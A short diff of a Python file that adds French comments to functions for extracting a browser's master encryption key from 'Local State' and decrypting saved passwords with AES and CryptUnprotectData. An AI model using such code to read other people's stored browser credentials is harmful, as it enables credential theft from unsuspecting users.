@@ -6,6 +6,7 @@ from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 
+# Fonction pour extraire la clé de chiffrement des navigateurs
 def get_master_key(path: str):
     if not os.path.exists(path + "\\Local State"):
         return None
@@ -17,6 +18,7 @@ def get_master_key(path: str):
     return unencrypted_key
 
 
+# Fonction pour déchiffrer les mots de passe
 def decrypt_password(buff: bytes, key: bytes) -> str:
     try:
         iv = buff[3:15]
